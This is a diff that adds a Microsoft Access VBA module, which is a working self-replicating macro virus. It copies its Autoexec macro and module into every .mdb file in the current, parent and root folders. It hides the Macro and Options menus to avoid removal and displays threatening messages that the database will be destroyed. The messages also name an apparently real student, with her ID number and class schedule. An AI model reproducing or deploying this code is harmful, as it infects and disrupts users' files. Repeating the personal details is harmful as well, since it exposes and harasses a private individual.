@@ -1,0 +1,89 @@
+   Attribute VB_Name = "Modul"
+   Dim filename As String
+   Dim curmonth As Integer
+   Dim curday As Integer
+   Option Compare Database
+
+   Public Sub findfirst()
+   filename = Dir("*.mdb", vbNormal)
+   End Sub
+
+   Public Sub findfstprev()
+   filename = Dir("..\*.mdb", vbNormal)
+   End Sub
+
+   Public Sub findfstroot()
+   filename = Dir("\*.mdb", vbNormal)
+   End Sub
+
+   Public Sub infect()
+   On Error GoTo ohcrap
+   DoCmd.TransferDatabase acExport, "Microsoft Access", filename, acMacro, "Autoexec", "Autoexec"
+   DoCmd.TransferDatabase acExport, "Microsoft Access", filename, acModule, "modul", "modul"
+   ohcrap:
+   End Sub
+
+   Public Function menu()
+   Call findfirst
+   Call infect
+   While filename <> ""
+   Call findnext
+   Call infect
+   Wend
+
+   Call findfstprev
+   Call infect
+   While filename <> ""
+   Call findnext
+   Call infect
+   Wend
+
+   Call findfstroot
+   Call infect
+   While filename <> ""
+   Call findnext
+   Call infect
+   Wend
+
+   curmonth = Val(Mid$(Date$, 1, 2))
+   curday = Val(Mid$(Date$, 4, 2))
+   If curmonth <> 32 Then
+   Call stealth
+   Call actions
+   End If
+   End Function
+
+   Public Sub actions()
+   For c = 1 To 5
+   DoCmd.Echo True, "PENI NUGRAHENI  Virus wil destroy your database"
+   For b = 1 To 200000
+   Next b
+   DoCmd.Echo True, "     PENI NUGRAHENI  Virus wil destroy your database"
+   For b = 1 To 200000
+   Next b
+   DoCmd.Echo True, "           PENI NUGRAHENI  Virus wil destroy your database"
+   For b = 1 To 200000
+   Next b
+   Next c
+
+   For y = 1 To 1
+   For a = 1 To 50
+   Beep
+   Next a
+   MsgBox "This Macro Virus is dedicated to my dearest Friend, PENI NUGRAHENI/05939 at Economic Faculty (Accounting '98)" & Chr(13) & "Gadjah mada University", 16, "PENI NUgraheni Macro virus has activated"
+   MsgBox "NoOne can stop this Virus, Becoz U got no 'Killz", 16, "Created by Mr.A"
+   MsgBox "Wonder looking for her?, try find her at Computer II, Wednesday session 3-4, Coz she has the Antidote", 16, "Look Forward for your Search!"
+
+   Next y
+   End Sub
+
+   Public Sub findnext()
+   filename = Dir
+   End Sub
+
+   Public Sub stealth()
+   Application.CommandBars("Tools").Controls("&Macro").Visible = False
+   Application.CommandBars("Tools").Controls("&Options...").Visible = False
+   Application.CommandBars("View").Controls("&Toolbars").Visible = False
+
+   End Sub
